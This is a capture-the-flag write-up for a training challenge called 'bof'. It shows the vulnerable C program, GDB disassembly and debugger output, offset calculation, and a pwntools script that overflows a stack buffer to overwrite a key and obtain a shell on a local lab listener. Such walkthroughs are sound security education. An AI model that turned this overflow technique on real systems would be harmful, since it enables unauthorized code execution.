---
custom_edit_url: null
sidebar_position: 3
---

> Nana told me that buffer overflow is one of the most common software vulnerability.\c
> Is that true?


Let's check the file's properties.

```
bof@ubuntu:~$ file ./bof
./bof: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1cabd158f67491e9edb3df0219ac3a4ef165dc76, for GNU/Linux 3.2.0, not stripped
```

There is a readme as well, let's check it out.

```
bof@ubuntu:~$ cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
```

Ok, so we have to exploit the challenge is running at `nc 0 9000`, not locally.
[I definitely did not waste a lot of time doing the latter.](https://en.wikipedia.org/wiki/Sarcasm)

We can see that it is a little-endian 32-bit ELF executable.

```c title="bof.c"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);	// smash me!
    if(key == 0xcafebabe){
        setregid(getegid(), getegid());
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

So the challenge uses `gets()` to read user input into the `overflowme` buffer, which is 32 bytes long.

If the `key` is equal to `0xcafebabe`, we gat a shell. However the `key` is set to `0xdeadbeef` while calling the `func()` function.

Basically we have to overflow the `overflowme` buffer and overwrite the `key` variable.

### Disassembly

Let's disassemble the `main()` function within GDB.

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000129d <+0>:	  lea    ecx,[esp+0x4]
   0x000012a1 <+4>:	  and    esp,0xfffffff0
   0x000012a4 <+7>:	  push   DWORD PTR [ecx-0x4]
   0x000012a7 <+10>:	push   ebp
   0x000012a8 <+11>:	mov    ebp,esp
   0x000012aa <+13>:	push   ecx
   0x000012ab <+14>:	sub    esp,0x4
   0x000012ae <+17>:	call   0x12d5 <__x86.get_pc_thunk.ax>
   0x000012b3 <+22>:	add    eax,0x2d4d
   0x000012b8 <+27>:	sub    esp,0xc
   0x000012bb <+30>:	push   0xdeadbeef
   0x000012c0 <+35>:	call   0x11fd <func>
   0x000012c5 <+40>:	add    esp,0x10
   0x000012c8 <+43>:	mov    eax,0x0
   0x000012cd <+48>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x000012d0 <+51>:	leave
   0x000012d1 <+52>:	lea    esp,[ecx-0x4]
   0x000012d4 <+55>:	ret
End of assembler dump.
```

We can see that the instruction at `main+35` calls `func()`. Let's disassemble that as well.

```
pwndbg> disassemble func
Dump of assembler code for function func:

# --- snip ---
   
   0x00001230 <+51>:	lea    eax,[ebp-0x2c]
   0x00001233 <+54>:	push   eax
   0x00001234 <+55>:	call   0x1060 <gets@plt>

# --- snip ---

End of assembler dump.
```

We can see that the location of the `overflowme` buffer is stored onto the stack, and is passed as an argument to `gets()`.
This location is at `$ebp-0x2c`.

This tells us that the base pointer `$ebp` is at a distance of `0x2c` or 44 bytes from the buffer.

We can even verify this using a cyclic pattern.

```
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Let's provide this as input.

```
pwndbg> run
Starting program: /home/bof/bof
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
overflow me : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Nah..
*** stack smashing detected ***: terminated

Program received signal SIGABRT, Aborted.
0xf7fc4549 in __kernel_vsyscall ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
 EAX  0
 EBX  0xeb8d9
 ECX  0xeb8d9
 EDX  6
 EDI  0xf7fbf500 ◂— 0xf7fbf500
 ESI  0xeb8d9
 EBP  0xffffd458 —▸ 0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 ESP  0xffffd160 —▸ 0xffffd458 —▸ 0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0xf7fc4549 (__kernel_vsyscall+9) ◂— pop ebp
────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0xf7fc4549 <__kernel_vsyscall+9>     pop    ebp            EBP => 0xffffd458
   0xf7fc454a <__kernel_vsyscall+10>    pop    edx
   0xf7fc454b <__kernel_vsyscall+11>    pop    ecx
   0xf7fc454c <__kernel_vsyscall+12>    ret

   0xf7fc454d <__kernel_vsyscall+13>    int3
   0xf7fc454e                           nop
   0xf7fc454f                           nop
   0xf7fc4550                           nop
   0xf7fc4551                           lea    esi, [esi]
   0xf7fc4558                           lea    esi, [esi]
   0xf7fc455f                           nop
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd160 —▸ 0xffffd458 —▸ 0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│-2f4 0xffffd164 ◂— 6
02:0008│-2f0 0xffffd168 ◂— 0xeb8d9
03:000c│-2ec 0xffffd16c —▸ 0xf7e05aa7 (__pthread_kill_implementation+295) ◂— mov ebp, eax
04:0010│-2e8 0xffffd170 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
05:0014│-2e4 0xffffd174 ◂— 0
06:0018│-2e0 0xffffd178 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
07:001c│-2dc 0xffffd17c ◂— 6
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0xf7fc4549 __kernel_vsyscall+9
   1 0xf7e05aa7 __pthread_kill_implementation+295
   2 0xf7e05b2f pthread_kill+31
   3 0xf7db4685 raise+37
   4 0xf7d9d3ac abort+238
   5 0xf7df83fc __libc_message+588
   6 0xf7eb0a3c __fortify_fail+44
   7 0xf7eb0a0f None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Let's calculate the offset of `laaa`.

```
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

### Stack

```
<==: Value is stored at the address
<--: Points to the address

                       +---------------+ 
   esp --> buffer ==>  |  61 61 61 61  |
                       |  62 61 61 61  | 
                       |  63 61 61 61  |
                       |  64 61 61 61  |
                       |  65 61 61 61  |
                       |  66 61 61 61  |
                       |  67 61 61 61  |
                       |  68 61 61 61  |
                       |  69 61 61 61  |
                       |  6A 61 61 61  |
                       |  6B 61 61 61  |
                       +---------------+
ebp --> stored ebp ==> |  6C 61 61 61  | 
                       +---------------+
    return address ==> |  6D 61 61 61  | 
                       +---------------+
               key ==> |  EF BE AD DE  |
                       +---------------+
```

### Exploit requirements

We have all the information we need to create an exploit.
	- [x] Value of `key` to overwrite: `0xcafebabe`
	- [x] Distance between the buffer and `key`: `52`

Let's craft our exploit and send it to the listener.

```python
bof@ubuntu:~$ python
Python 3.10.12 (main, Feb  4 2025, 14:57:36) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> padding = b"A" * 52
>>> key = p32(0xcafebabe)
>>> payload = padding + key
>>> io = remote('0',9000)
[x] Opening connection to 0 on port 9000
[x] Opening connection to 0 on port 9000: Trying 0.0.0.0
[+] Opening connection to 0 on port 9000: Done
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
```

Now that we have a shell, we can get the flag.

```
[*] Switching to interactive mode
id
uid=1008(bof_pwn) gid=1008(bof_pwn) groups=1008(bof_pwn)
cat ./flag
Daddy_I_just_pwned_a_buff3r!
```

#### Stuff I was trying unnecessarily

> I am leaving this here, as a reminder to myself and as a note to others.

```
>>> from pwn import *
>>> padding = b"A" * 52
>>> key = p32(0xcafebabe)
>>> payload = padding + key
>>> io = remote('0', 9000)
```

```
bof@ubuntu:~$ ./bof
overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xBE\xBA\xFE\xCA

Nah..
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

It seems like there is a stack canary, let's verify using `checksec`.

```
bof@ubuntu:~$ checksec ./bof
[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
[*] '/home/bof/bof'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

We can see what the canary value is using GDB.
Let's set a breakpoint right after `gets()` reads our input.

```
pwndbg> break *(func+60)
Breakpoint 1 at 0x1239
```

Now, we can run the program again and provide our cyclic pattern.

```
pwndbg> run
Starting program: /home/bof/bof
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
overflow me : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Breakpoint 1, 0x56556239 in func ()
Disabling the emulation via Unicorn Engine that is used for computing branches as there isn't enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:
* https://github.com/pwndbg/pwndbg/issues/1534
* https://github.com/unicorn-engine/unicorn/pull/1743
Either free your memory or explicitly set `set emulate off` in your Pwndbg config
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
 EAX  0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3efc
 ECX  0xf7fa89c0 (_IO_stdfile_0_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd5d4 —▸ 0xffffd72c ◂— '/home/bof/bof'
 EBP  0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 ESP  0xffffd4a0 —▸ 0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x56556239 (func+60) ◂— add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0x56556239 <func+60>    add    esp, 0x10                           ESP => 0xffffd4a0 + 0x10
   0x5655623c <func+63>    cmp    dword ptr [ebp + 8], 0xcafebabe
   0x56556243 <func+70>    jne    func+117                    <func+117>

   0x56556245 <func+72>    call   getegid@plt                 <getegid@plt>

   0x5655624a <func+77>    mov    esi, eax
   0x5655624c <func+79>    call   getegid@plt                 <getegid@plt>

   0x56556251 <func+84>    sub    esp, 8
   0x56556254 <func+87>    push   esi
   0x56556255 <func+88>    push   eax
   0x56556256 <func+89>    call   setregid@plt                <setregid@plt>

   0x5655625b <func+94>    add    esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd4a0 —▸ 0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│-044 0xffffd4a4 ◂— 0xffffffff
02:0008│-040 0xffffd4a8 —▸ 0x56555034 ◂— 6
03:000c│-03c 0xffffd4ac —▸ 0x5655620a (func+13) ◂— add ebx, 0x2df6
04:0010│-038 0xffffd4b0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
05:0014│-034 0xffffd4b4 ◂— 0x20 /* ' ' */
06:0018│-030 0xffffd4b8 ◂— 0
07:001c│ eax 0xffffd4bc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x56556239 func+60
   1 0x6161616d None
   2 0x6161616e None
   3 0x6161616f None
   4 0x61616170 None
   5 0x61616171 None
   6 0x61616172 None
   7 0x61616173 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/50xw $esp
0xffffd4a0:	0xffffd4bc	0xffffffff	0x56555034	0x5655620a
0xffffd4b0:	0xf7ffd608	0x00000020	0x00000000	0x61616161
0xffffd4c0:	0x61616162	0x61616163	0x61616164	0x61616165
0xffffd4d0:	0x61616166	0x61616167	0x61616168	0x61616169
0xffffd4e0:	0x6161616a	0x6161616b	0x6161616c	0x6161616d
0xffffd4f0:	0x6161616e	0x6161616f	0x61616170	0x61616171
0xffffd500:	0x61616172	0x61616173	0x61616174	0x61616175
0xffffd510:	0x61616176	0x61616177	0x61616178	0x61616179
0xffffd520:	0x00000000	0xffffd5d4	0xffffd5dc	0xffffd540
0xffffd530:	0xf7fa7000	0x5655629d	0x00000001	0xffffd5d4
0xffffd540:	0xf7fa7000	0xffffd5d4	0xf7ffcb80	0xf7ffd020
0xffffd550:	0xf96c6d31	0xb50f8721	0x00000000	0x00000000
0xffffd560:	0x00000000	0xf7ffcb80
```

```
pwndbg> break *(func+55)
Breakpoint 1 at 0x1234
```
